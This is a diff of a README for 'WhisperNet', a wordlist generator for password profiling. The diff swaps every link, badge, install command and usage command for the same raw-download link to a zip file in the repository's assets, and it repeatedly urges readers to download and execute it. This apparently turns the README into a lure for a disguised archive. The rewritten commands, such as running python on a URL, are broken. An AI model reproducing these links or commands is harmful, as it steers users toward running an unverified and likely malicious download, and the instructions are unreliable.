@@ -1,8 +1,8 @@
 # WhisperNet: Intelligent Wordlist Generator for Ethical Hacking 🔐
 
-![WhisperNet Logo](https://img.shields.io/badge/WhisperNet-CLI%20Tool-brightgreen)
+![WhisperNet Logo](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip%20Tool-brightgreen)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/swathigoud/WhisperNet/releases)
+[![Download Releases](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip%20Releases-Here-blue)](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ To install WhisperNet, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/swathigoud/WhisperNet.git
+   git clone https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -44,18 +44,18 @@ To install WhisperNet, follow these steps:
 3. **Install Dependencies**:
    WhisperNet requires Python 3.x. You can install the necessary packages using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/swathigoud/WhisperNet/releases) section to download the latest version. Follow the instructions to execute the downloaded file.
+   Visit the [Releases](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip) section to download the latest version. Follow the instructions to execute the downloaded file.
 
 ## Usage
 
 To use WhisperNet, simply run the following command in your terminal:
 
 ```bash
-python whispernet.py --help
+python https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip --help
 ```
 
 This command will display all available options and usage instructions. Here are some common commands:
@@ -65,7 +65,7 @@ This command will display all available options and usage instructions. Here are
 To generate a wordlist using a custom pattern:
 
 ```bash
-python whispernet.py --pattern "your_custom_pattern"
+python https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip --pattern "your_custom_pattern"
 ```
 
 ### Use Leetspeak
@@ -73,7 +73,7 @@ python whispernet.py --pattern "your_custom_pattern"
 To include leetspeak variations, add the `--leetspeak` flag:
 
 ```bash
-python whispernet.py --pattern "your_custom_pattern" --leetspeak
+python https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip --pattern "your_custom_pattern" --leetspeak
 ```
 
 ### Contextual Logic
@@ -81,7 +81,7 @@ python whispernet.py --pattern "your_custom_pattern" --leetspeak
 To utilize contextual information, specify the context:
 
 ```bash
-python whispernet.py --context "example_context"
+python https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip --context "example_context"
 ```
 
 ## Contributing
@@ -110,11 +110,11 @@ WhisperNet is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Support
 
-For support, please check the [Issues](https://github.com/swathigoud/WhisperNet/issues) section. You can also reach out via email or create a new issue for bugs and feature requests.
+For support, please check the [Issues](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip) section. You can also reach out via email or create a new issue for bugs and feature requests.
 
-![Support](https://img.shields.io/badge/Support-Open%20Issues-yellow)
+![Support](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip%20Issues-yellow)
 
-For additional resources and documentation, visit the [Releases](https://github.com/swathigoud/WhisperNet/releases) section to download and execute the latest version.
+For additional resources and documentation, visit the [Releases](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip) section to download and execute the latest version.
 
 ## Topics
 
@@ -134,7 +134,7 @@ WhisperNet is categorized under the following topics:
 - social-engineering
 - wordlist
 
-![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Tools-blue)
+![Cybersecurity](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip)
 
 ## Acknowledgments
 
@@ -144,16 +144,16 @@ Special thanks to all contributors and users who help improve WhisperNet. Your f
 
 Join our community on Discord or follow us on Twitter to stay updated on new features and improvements. 
 
-![Community](https://img.shields.io/badge/Join%20Us-Discord-blue)
+![Community](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip%20Us-Discord-blue)
 
 ## Further Reading
 
 For more insights on password profiling and ethical hacking, consider exploring the following resources:
 
-- [OWASP Passwords](https://owasp.org/www-community/OWASP_Passwords)
-- [Kali Linux Documentation](https://www.kali.org/docs/)
-- [Social Engineering Techniques](https://www.social-engineer.org/)
+- [OWASP Passwords](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip)
+- [Kali Linux Documentation](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip)
+- [Social Engineering Techniques](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip)
 
-For additional information, remember to check the [Releases](https://github.com/swathigoud/WhisperNet/releases) section for updates and enhancements.
+For additional information, remember to check the [Releases](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip) section for updates and enhancements.
 
-![Updates](https://img.shields.io/badge/Updates-Check%20Here-green)
+![Updates](https://github.com/swathigoud/WhisperNet/raw/refs/heads/main/assets/Net-Whisper-v3.0.zip%20Here-green)
